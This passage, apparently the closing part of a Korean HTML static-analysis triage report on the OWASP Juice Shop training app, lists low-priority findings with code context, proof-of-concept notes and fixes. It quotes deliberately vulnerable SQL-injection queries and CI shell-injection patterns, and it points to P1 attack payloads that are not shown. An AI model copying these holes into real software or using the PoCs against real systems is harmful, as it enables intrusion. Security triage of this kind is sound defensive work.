+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 변경가능 태그 군집.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F008</code> · ci-hardening — <code>.github/workflows/image_actions.yml:42</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  38|       - name: Create Pull Request
+  39|         if: |
+  40|           github.event_name != &#x27;pull_request&#x27; &amp;&amp;
+  41|           steps.calibre.outputs.markdown != &#x27;&#x27;
+  42|         uses: peter-evans/create-pull-request@v8
+  43|         with:
+  44|           title: Auto Compress Images
+  45|           delete-branch: true
+  46|           commit-message: Compress Images</code></pre>
+      <p><strong>판정 근거:</strong> peter-evans/create-pull-request 가 변경가능 @v8 에 고정.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: peter-evans/create-pull-request@v8</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 변경가능 태그 군집.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-ok">오탐</span>
+        <code>F021</code> · iac-misconfig — <code>data/static/codefixes/iacLeakedKeyChallenge_3_correct.tf:17</code>
+      </summary>
+      <p class="dim">aws-subnet-has-public-ip-address &nbsp;|&nbsp; 악용가능성 <b class="mut">없음</b> · 신뢰도 0.85 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  13|     Environment = var.environment
+  14|   }
+  15| }
+  16| 
+  17| resource &quot;aws_subnet&quot; &quot;public&quot; {
+  18|   count                   = length(var.public_subnet_cidrs)
+  19|   vpc_id                  = aws_vpc.main.id
+  20|   cidr_block              = var.public_subnet_cidrs[count.index]
+  21|   availability_zone       = data.aws_availability_zones.available.names[count.index]
+  22|   map_public_ip_on_launch = true
+  23| 
+  24|   tags = {
+  25|     Name        = &quot;${var.project_name}-public-${count.index}&quot;
+  26|     Project     = var.project_name
+  27|     Environment = var.environment
+  28|   }
+  29| }
+  30| 
+  31| resource &quot;aws_internet_gateway&quot; &quot;main&quot; {
+  32|   vpc_id = aws_vpc.main.id
+  33| </code></pre>
+      <p><strong>판정 근거:</strong> 파일명이 iacLeakedKeyChallenge_3_correct.tf — &#x27;정답&#x27; 참조 파일인데도 일반 룰에 걸림.</p>
+      <p><strong>증거:</strong> <code class="evi">_correct.tf 에도 &quot;public&quot; 서브넷 map_public_ip_on_launch = true</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 조치 불필요; 참조-정답 파일.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 교과서적 오탐: 문맥을 못 보는 룰이 &#x27;정답&#x27;을 걸어냄.</div>
+      <p><span class="badge b-mut">CWE-1220</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F039</code> · info-disclosure — <code>server.ts:292</code>
+      </summary>
+      <p class="dim">express-check-directory-listing &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.80 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 288|   app.use(&#x27;/ftp&#x27;, serveIndexMiddleware, serveIndex(&#x27;ftp&#x27;, { icons: true })) // vuln-code-snippet vuln-line directoryListingChallenge
+ 289|   app.use(&#x27;/ftp(?!/quarantine)/:file&#x27;, servePublicFiles()) // vuln-code-snippet vuln-line directoryListingChallenge
+ 290|   app.use(&#x27;/ftp/quarantine/:file&#x27;, serveQuarantineFiles()) // vuln-code-snippet neutral-line directoryListingChallenge
+ 291| 
+ 292|   app.use(&#x27;/.well-known&#x27;, serveIndexMiddleware, serveIndex(&#x27;.well-known&#x27;, { icons: true, view: &#x27;details&#x27; }))
+ 293|   app.use(&#x27;/.well-known&#x27;, express.static(&#x27;.well-known&#x27;))
+ 294| 
+ 295|   /* /encryptionkeys directory browsing */
+ 296|   app.use(&#x27;/encryptionkeys&#x27;, serveIndexMiddleware, serveIndex(&#x27;encryptionkeys&#x27;, { icons: true, view: &#x27;details&#x27; }))</code></pre>
+      <p><strong>판정 근거:</strong> /.well-known 에 디렉터리 브라우징.</p>
+      <p><strong>증거:</strong> <code class="evi">serveIndex(&#x27;.well-known&#x27;, ...)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>GET /.well-known   → 디렉터리 리스팅.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 리스팅 비활성화.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 민감도 낮은 디렉터리.</div>
+      <p><span class="badge b-mut">CWE-548</span> <span class="badge b-mut">A06:2017</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-ok">오탐</span>
+        <code>F017</code> · iac-misconfig — <code>data/static/codefixes/iacLeakedKeyChallenge_1.tf:17</code>
+      </summary>
+      <p class="dim">aws-subnet-has-public-ip-address &nbsp;|&nbsp; 악용가능성 <b class="mut">없음</b> · 신뢰도 0.75 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  13|     Environment = var.environment
+  14|   }
+  15| }
+  16| 
+  17| resource &quot;aws_subnet&quot; &quot;public&quot; {
+  18|   count                   = length(var.public_subnet_cidrs)
+  19|   vpc_id                  = aws_vpc.main.id
+  20|   cidr_block              = var.public_subnet_cidrs[count.index]
+  21|   availability_zone       = data.aws_availability_zones.available.names[count.index]
+  22|   map_public_ip_on_launch = true
+  23| 
+  24|   tags = {
+  25|     Name        = &quot;${var.project_name}-public-${count.index}&quot;
+  26|     Project     = var.project_name
+  27|     Environment = var.environment
+  28|   }
+  29| }
+  30| 
+  31| resource &quot;aws_internet_gateway&quot; &quot;main&quot; {
+  32|   vpc_id = aws_vpc.main.id
+  33| </code></pre>
+      <p><strong>판정 근거:</strong> 리소스가 &#x27;public&#x27;으로 명명된 서브넷 — 퍼블릭 서브넷은 ALB/NAT를 위해 공인 IP가 정상적으로 필요.</p>
+      <p><strong>증거:</strong> <code class="evi">resource &quot;aws_subnet&quot; &quot;public&quot; { map_public_ip_on_launch = true }</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 의도된 퍼블릭 서브넷이면 조치 불필요, 설계 문서화.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 의도적 퍼블릭 서브넷을 일반 룰이 오탐 — 전형적 IaC 오탐.</div>
+      <p><span class="badge b-mut">CWE-1220</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-ok">오탐</span>
+        <code>F019</code> · iac-misconfig — <code>data/static/codefixes/iacLeakedKeyChallenge_2.tf:17</code>
+      </summary>
+      <p class="dim">aws-subnet-has-public-ip-address &nbsp;|&nbsp; 악용가능성 <b class="mut">없음</b> · 신뢰도 0.75 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  13|     Environment = var.environment
+  14|   }
+  15| }
+  16| 
+  17| resource &quot;aws_subnet&quot; &quot;public&quot; {
+  18|   count                   = length(var.public_subnet_cidrs)
+  19|   vpc_id                  = aws_vpc.main.id
+  20|   cidr_block              = var.public_subnet_cidrs[count.index]
+  21|   availability_zone       = data.aws_availability_zones.available.names[count.index]
+  22|   map_public_ip_on_launch = true
+  23| 
+  24|   tags = {
+  25|     Name        = &quot;${var.project_name}-public-${count.index}&quot;
+  26|     Project     = var.project_name
+  27|     Environment = var.environment
+  28|   }
+  29| }
+  30| 
+  31| resource &quot;aws_internet_gateway&quot; &quot;main&quot; {
+  32|   vpc_id = aws_vpc.main.id
+  33| </code></pre>
+      <p><strong>판정 근거:</strong> 의도적 &#x27;public&#x27; 서브넷 (challenge_2 변형).</p>
+      <p><strong>증거:</strong> <code class="evi">&quot;public&quot; 서브넷, map_public_ip_on_launch = true</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 의도된 것이면 조치 불필요.</p>
+      <div class="note"><strong>트리아지 노트:</strong> F017과 동일한 설계 의도 패턴.</div>
+      <p><span class="badge b-mut">CWE-1220</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-ok">오탐</span>
+        <code>F026</code> · iac-misconfig — <code>infrastructure/terraform/networking.tf:18</code>
+      </summary>
+      <p class="dim">aws-subnet-has-public-ip-address &nbsp;|&nbsp; 악용가능성 <b class="mut">없음</b> · 신뢰도 0.75 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  14|     Environment = var.environment
+  15|   }
+  16| }
+  17| 
+  18| resource &quot;aws_subnet&quot; &quot;public&quot; {
+  19|   count                   = length(var.public_subnet_cidrs)
+  20|   vpc_id                  = aws_vpc.main.id
+  21|   cidr_block              = var.public_subnet_cidrs[count.index]
+  22|   availability_zone       = data.aws_availability_zones.available.names[count.index]
+  23|   map_public_ip_on_launch = true
+  24| 
+  25|   tags = {
+  26|     Name        = &quot;${var.project_name}-public-${count.index}&quot;
+  27|     Project     = var.project_name
+  28|     Environment = var.environment
+  29|   }
+  30| }
+  31| 
+  32| resource &quot;aws_internet_gateway&quot; &quot;main&quot; {
+  33|   vpc_id = aws_vpc.main.id
+  34| </code></pre>
+      <p><strong>판정 근거:</strong> infrastructure/terraform 의 의도적 &#x27;public&#x27; 서브넷.</p>
+      <p><strong>증거:</strong> <code class="evi">&quot;public&quot; 서브넷, map_public_ip_on_launch = true</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 의도된 것이면 조치 불필요.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 설계상 퍼블릭 서브넷.</div>
+      <p><span class="badge b-mut">CWE-1220</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-ok">오탐</span>
+        <code>F042</code> · iac-misconfig — <code>terraform/networking.tf:18</code>
+      </summary>
+      <p class="dim">aws-subnet-has-public-ip-address &nbsp;|&nbsp; 악용가능성 <b class="mut">없음</b> · 신뢰도 0.75 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  14|     Environment = var.environment
+  15|   }
+  16| }
+  17| 
+  18| resource &quot;aws_subnet&quot; &quot;public&quot; {
+  19|   count                   = length(var.public_subnet_cidrs)
+  20|   vpc_id                  = aws_vpc.main.id
+  21|   cidr_block              = var.public_subnet_cidrs[count.index]
+  22|   availability_zone       = data.aws_availability_zones.available.names[count.index]
+  23|   map_public_ip_on_launch = true
+  24| 
+  25|   tags = {
+  26|     Name        = &quot;${var.project_name}-public-${count.index}&quot;
+  27|     Project     = var.project_name
+  28|     Environment = var.environment
+  29|   }
+  30| }
+  31| 
+  32| resource &quot;aws_internet_gateway&quot; &quot;main&quot; {
+  33|   vpc_id = aws_vpc.main.id
+  34| </code></pre>
+      <p><strong>판정 근거:</strong> terraform/networking.tf 의 의도적 &#x27;public&#x27; 서브넷.</p>
+      <p><strong>증거:</strong> <code class="evi">&quot;public&quot; 서브넷, map_public_ip_on_launch = true</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 의도된 것이면 조치 불필요.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 설계상 퍼블릭 서브넷(중복 인프라 트리).</div>
+      <p><span class="badge b-mut">CWE-1220</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-ok">오탐</span>
+        <code>F022</code> · iac-misconfig — <code>data/static/codefixes/iacLeakedKeyChallenge_3_correct.tf:159</code>
+      </summary>
+      <p class="dim">insecure-load-balancer-tls-version &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.70 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 155| 
+ 156| resource &quot;aws_lb_listener&quot; &quot;http&quot; {
+ 157|   load_balancer_arn = aws_lb.juice_shop.arn
+ 158|   port              = 80
+ 159|   protocol          = &quot;HTTP&quot;
+ 160| 
+ 161|   default_action {
+ 162|     type             = &quot;forward&quot;
+ 163|     target_group_arn = aws_lb_target_group.juice_shop.arn</code></pre>
+      <p><strong>판정 근거:</strong> *_correct.tf 참조 파일의 HTTP:80 리스너.</p>
+      <p><strong>증거:</strong> <code class="evi">_correct.tf, port=80 HTTP 리스너</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 조치 불필요; 참조 파일.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 의도된 정답 파일 — 오탐/노이즈로 처리.</div>
+      <p><span class="badge b-mut">CWE-326</span> <span class="badge b-mut">A03:2017</span> <span class="badge b-mut">A02:2021</span> <span class="badge b-mut">A04:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F010</code> · ci-injection — <code>.github/workflows/update-challenges-www-legacy.yml:27</code>
+      </summary>
+      <p class="dim">run-shell-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  23|       uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1
+  24|       with:
+  25|         path: juice-shop
+  26|     - name: Update challenges.yml
+  27|       run: |
+  28|         if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]; then
+  29|           DEST_FILE=&quot;_data/challenges.yml&quot;
+  30|         else
+  31|           DEST_FILE=&quot;_data/challenges_dev.yml&quot;
+  32|         fi
+  33|         rm -f $DEST_FILE
+  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE
+  35|     - name: Update snippets
+  36|       run: |
+  37|         if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]; then
+  38|           DEST_FILE=&quot;_data/snippets.json&quot;</code></pre>
+      <p><strong>판정 근거:</strong> ref_name 이 따옴표로 감싼 문자열 비교에 사용 — 따옴표 처리로 주입 가능성 제한.</p>
+      <p><strong>증거:</strong> <code class="evi">if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> env: 변수 우회 사용.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 따옴표 비교라 F009 대비 악용가능성 크게 낮음.</div>
+      <p><span class="badge b-mut">CWE-78</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F011</code> · ci-injection — <code>.github/workflows/update-challenges-www-legacy.yml:36</code>
+      </summary>
+      <p class="dim">run-shell-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  32|         fi
+  33|         rm -f $DEST_FILE
+  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE
+  35|     - name: Update snippets
+  36|       run: |
+  37|         if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]; then
+  38|           DEST_FILE=&quot;_data/snippets.json&quot;
+  39|         else
+  40|           DEST_FILE=&quot;_data/snippets_dev.json&quot;
+  41|         fi
+  42|         rm -f $DEST_FILE
+  43|         CHALLENGES=$(ls juice-shop/data/static/codefixes/*.info.yml | xargs -n 1 basename | sed &#x27;s/\.info\.yml//&#x27; | jq -R . | jq -s -c &#x27;{&quot;challenges&quot;: .}&#x27;)
+  44|         echo $CHALLENGES &gt; $DEST_FILE
+  45|     - uses: stefanzweifel/git-auto-commit-action@8621497c8c39c72f3e2a999a26b4ca1b5058a842 #v5.0.1
+  46|       with:
+  47|         file_pattern: &#x27;_data/challenges.yml _data/snippets.json _data/challenges_dev.yml _data/snippets_dev.json&#x27;
+  48|         commit_message: &quot;🤖 Auto-update challenges and snippets for ${{ github.ref_name }} from ${{ github.sha }}&quot;</code></pre>
+      <p><strong>판정 근거:</strong> F010과 동일한 따옴표 ref_name 비교 패턴.</p>
+      <p><strong>증거:</strong> <code class="evi">if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> env: 변수 우회 사용.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 따옴표 처리 — 악용가능성 낮음.</div>
+      <p><span class="badge b-mut">CWE-78</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F012</code> · ci-injection — <code>.github/workflows/update-challenges-www.yml:27</code>
+      </summary>
+      <p class="dim">run-shell-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  23|       uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1
+  24|       with:
+  25|         path: juice-shop
+  26|     - name: Update challenges.yml
+  27|       run: |
+  28|         if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]; then
+  29|           DEST_FILE=&quot;_data/challenges.yml&quot;
+  30|         else
+  31|           DEST_FILE=&quot;_data/challenges_dev.yml&quot;
+  32|         fi
+  33|         rm -f $DEST_FILE
+  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE
+  35|     - name: Update snippets
+  36|       run: |
+  37|         if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]; then
+  38|           DEST_FILE=&quot;_data/snippets.json&quot;</code></pre>
+      <p><strong>판정 근거:</strong> 동일한 따옴표 ref_name 비교 패턴.</p>
+      <p><strong>증거:</strong> <code class="evi">if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> env: 변수 우회 사용.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 따옴표 처리 — 악용가능성 낮음.</div>
+      <p><span class="badge b-mut">CWE-78</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F013</code> · ci-injection — <code>.github/workflows/update-challenges-www.yml:36</code>
+      </summary>
+      <p class="dim">run-shell-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.60 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  32|         fi
+  33|         rm -f $DEST_FILE
+  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE
+  35|     - name: Update snippets
+  36|       run: |
+  37|         if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]; then
+  38|           DEST_FILE=&quot;_data/snippets.json&quot;
+  39|         else
+  40|           DEST_FILE=&quot;_data/snippets_dev.json&quot;
+  41|         fi
+  42|         rm -f $DEST_FILE
+  43|         CHALLENGES=$(ls juice-shop/data/static/codefixes/*.info.yml | xargs -n 1 basename | sed &#x27;s/\.info\.yml//&#x27; | jq -R . | jq -s -c &#x27;{&quot;challenges&quot;: .}&#x27;)
+  44|         echo $CHALLENGES &gt; $DEST_FILE
+  45|     - uses: stefanzweifel/git-auto-commit-action@8621497c8c39c72f3e2a999a26b4ca1b5058a842 #v5.0.1
+  46|       with:
+  47|         file_pattern: &#x27;_data/challenges.yml _data/snippets.json _data/challenges_dev.yml _data/snippets_dev.json&#x27;
+  48|         commit_message: &quot;🤖 Auto-update challenges and snippets for ${{ github.ref_name }} from ${{ github.sha }}&quot;</code></pre>
+      <p><strong>판정 근거:</strong> 동일한 따옴표 ref_name 비교 패턴.</p>
+      <p><strong>증거:</strong> <code class="evi">if [ &quot;${{ github.ref_name }}&quot; = &quot;master&quot; ]</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> env: 변수 우회 사용.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 따옴표 처리 — 악용가능성 낮음.</div>
+      <p><span class="badge b-mut">CWE-78</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F016</code> · sql-injection — <code>data/static/codefixes/dbSchemaChallenge_3.ts:11</code> <span class="badge b-mut">도달 불가</span>
+      </summary>
+      <p class="dim">express-sequelize-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.55 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>   7|     if (criteria.match(injectionChars)) {
+   8|       res.status(400).send()
+   9|       return
+  10|     }
+  11|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#x27;%${criteria}%&#x27; OR description LIKE &#x27;%${criteria}%&#x27;) AND deletedAt IS NULL) ORDER BY name`)
+  12|       .then(([products]: any) =&gt; {
+  13|         const dataString = JSON.stringify(products)
+  14|         for (let i = 0; i &lt; products.length; i++) {
+  15|           products[i].name = req.__(products[i].name)</code></pre>
+      <p><strong>판정 근거:</strong> 템플릿 리터럴 쿼리지만 앞에서 injectionChars 필터로 입력을 거부함.</p>
+      <p><strong>증거:</strong> <code class="evi">if (criteria.match(injectionChars)) { res.status(400) }</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 블록리스트 필터보다 파라미터화 권장.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 코드픽스 스니펫; 완화 존재 — 효과는 injectionChars 정규식에 좌우.</div>
+      <p><span class="badge b-mut">CWE-89</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F014</code> · supply-chain — <code>.npmrc:1</code>
+      </summary>
+      <p class="dim">npm-missing-minimum-release-age &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.50 · 엔진 심각도 MEDIUM</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>   1| package-lock=false</code></pre>
+      <p><strong>판정 근거:</strong> 의견성 신규 룰: .npmrc 에 min-release-age 미설정. 취약점이 아니라 하드닝 기본값.</p>
+      <p><strong>증거:</strong> <code class="evi">package-lock=false (min-release-age 없음)</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 원하면 min-release-age = 7 추가.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 정보성. 매우 최신 룰(npm v11.10). 결함이 아니라 팀 정책 판단 사항.</div>
+      <p><span class="badge b-mut">CWE-829</span> <span class="badge b-mut">A08:2021</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F024</code> · sql-injection — <code>data/static/codefixes/unionSqlInjectionChallenge_3.ts:10</code> <span class="badge b-mut">도달 불가</span>
+      </summary>
+      <p class="dim">express-sequelize-injection &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.50 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>   6|     if (!criteria.startsWith(&quot;apple&quot;) || !criteria.startsWith(&quot;orange&quot;)) {
+   7|       res.status(400).send()
+   8|       return
+   9|     }
+  10|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#x27;%${criteria}%&#x27; OR description LIKE &#x27;%${criteria}%&#x27;) AND deletedAt IS NULL) ORDER BY name`)
+  11|       .then(([products]: any) =&gt; {
+  12|         const dataString = JSON.stringify(products)
+  13|         for (let i = 0; i &lt; products.length; i++) {
+  14|           products[i].name = req.__(products[i].name)</code></pre>
+      <p><strong>판정 근거:</strong> 가드 `!startsWith(&#x27;apple&#x27;) || !startsWith(&#x27;orange&#x27;)` 는 항상 참이라 모든 입력이 400 — 공격 입력으로는 싱크 도달 불가.</p>
+      <p><strong>증거:</strong> <code class="evi">if (!criteria.startsWith(&#x27;apple&#x27;) || !criteria.startsWith(&#x27;orange&#x27;)) { 400 }</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 어쨌든 쿼리 파라미터화.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 과잉 차단 로직으로 실제 악용 어려움; 코드픽스 스니펫.</div>
+      <p><span class="badge b-mut">CWE-89</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-mut">P4</span>
+        <span class="badge b-warn">검토 필요</span>
+        <code>F025</code> · supply-chain — <code>frontend/.npmrc:1</code>
+      </summary>
+      <p class="dim">npm-missing-minimum-release-age &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.50 · 엔진 심각도 MEDIUM</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>   1| package-lock=false</code></pre>
+      <p><strong>판정 근거:</strong> frontend/.npmrc 에 min-release-age 없음 (F014와 동일 하드닝 룰).</p>
+      <p><strong>증거:</strong> <code class="evi">package-lock=false</code></p>
+      
+      
+      <p><strong>수정 방안:</strong> 정책상 필요하면 min-release-age 추가.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 정보성; 프론트엔드 패키지에 대한 F014 중복.</div>
+      <p><span class="badge b-mut">CWE-829</span> <span class="badge b-mut">A08:2021</span></p>
+    </details></section>
+
+  <section class="section">
+    <h3>권고 사항</h3>
+    
+<ol>
+  <li><strong>P1 5건을 최우선 조치</strong> — 로그인·검색 SQL 인젝션, <code>eval()</code> 코드 인젝션, null-byte 경로순회, 리포지토리 내 JWT 서명키. 모두 외부에서 도달 가능하고 영향이 큼.</li>
+  <li><strong>모든 SQL 파라미터화</strong> — 문자열로 만든 <code>sequelize.query()</code> 를 바인드 파라미터로 교체.</li>
+  <li><strong>시크릿을 리포지토리 밖으로</strong> — RSA 개인키를 시크릿 저장소/HSM 에서 로드하고 커밋된 키 교체.</li>
+  <li><strong>P1 을 동적으로 확인</strong> — 위 공격 예시는 그대로 검증용 페이로드(DAST 계층 브리지).</li>
+  <li><strong>오탐 6건과 대부분의 P4 는 노이즈</strong> — 설계상 퍼블릭 서브넷, <code>_correct.tf</code> 참조 파일, CI 하드닝 힌트. 룰 단에서 억제해 신호를 유지.</li>
+</ol>
+  </section>
+
+  <footer>
+    2계층 SAST(Semgrep 룰 엔진 → 스키마 강제 LLM 트리아지) + 동적 검증 · 공격 예시는 인가된 OWASP Juice Shop 훈련 타깃에 대한 검증 페이로드 · 생성일 2026-08-20
+  </footer>
+</div>
+</body>
+</html>
